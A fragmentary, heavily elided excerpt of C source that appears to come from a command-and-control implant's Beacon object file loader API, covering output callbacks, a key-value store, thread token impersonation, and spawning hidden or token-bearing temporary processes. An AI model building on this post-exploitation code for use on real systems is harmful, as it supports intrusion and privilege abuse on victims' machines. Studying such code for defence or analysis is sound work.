...
PVOID LdrModulePebString( PCHAR ModuleString )
{
    ...
    return ((INSTANCE *)Instance)->Win32.GetModuleHandleA( ModuleString );
}
...
{
    return ((INSTANCE *)Instance)->Win32.FreeLibrary( hLibModule );
}

HLOCAL LdrLocalFree( PVOID hMem )
{
    return ((INSTANCE *)Instance)->Win32.LocalFree( hMem );
}
...
{
    PCOFFEE Entry = ((INSTANCE *)Instance)->Coffees;
...
VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
{
    ...
    CallbackOutput = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, CallbackSize + 1 );
    if ( ! CallbackOutput ) {
    ...
    if ( ((INSTANCE *)Instance)->Win32.vsnprintf( CallbackOutput, CallbackSize, fmt, VaListArg ) < 0 ) {
...
VOID BeaconFormatAlloc( PFORMAT format, int maxsz )
{
    ...
    format->original = ((INSTANCE *)Instance)->Win32.LocalAlloc(maxsz, 1);
...
VOID BeaconFormatFree( PFORMAT format )
{
    ...
    if ( format->original )
    {
        ((INSTANCE *)Instance)->Win32.LocalFree( format->original );
...
VOID BeaconFormatPrintf( PFORMAT format, char* fmt, ... )
{
    ...
    va_start( args, fmt );
    length = ((INSTANCE *)Instance)->Win32.vsnprintf( NULL, 0, fmt, args );
    va_end( args );
    ...
    va_start( args, fmt );
    ((INSTANCE *)Instance)->Win32.vsnprintf( format->buffer, length, fmt, args );
    va_end( args );
...
BOOL BeaconUseToken( HANDLE token )
{
    ...
    if ( ! ((INSTANCE *)Instance)->Win32.SetThreadToken( NULL, hImpersonateToken ) ) {
        return FALSE;
    }
...
VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
{
    ...
    if ( x86 ) {
        Path = ((INSTANCE *)Instance)->Config.Process.Spawn86;
    } else {
        Path = ((INSTANCE *)Instance)->Config.Process.Spawn64;
    }
...
BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo )
{
    ...
    if (ignoreToken)
    {
        bSuccess = ((INSTANCE *)Instance)->Win32.CreateProcessW(NULL, Path, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
    }
    else
    {
        bSuccess = ((INSTANCE *)Instance)->Win32.CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, Path, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, sInfo, pInfo);
    }
...
BOOL BeaconAddValue(const char * key, void * ptr)
{
    ...
    KeyValue = ((INSTANCE *)Instance)->CoffeKeyValueStore;
    while ( KeyValue )
    {
    ...
    KeyValue = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( COFFEE_KEY_VALUE ) );

    KeyValue->Value = ptr;
    StringCopyA( KeyValue->Key, key );

    // store the new item at the start of the list
    KeyValue->Next = ((INSTANCE *)Instance)->CoffeKeyValueStore;
    ((INSTANCE *)Instance)->CoffeKeyValueStore = KeyValue;
...
BOOL BeaconRemoveValue(const char * key)
{
    ...
    Current = ((INSTANCE *)Instance)->CoffeKeyValueStore;
    while ( Current )
    {
        if ( StringCompareA( Current->Key, key ) == 0 )
        {
            if ( Prev ) {
                ...
                ((INSTANCE *)Instance)->CoffeKeyValueStore = Current->Next;
            }
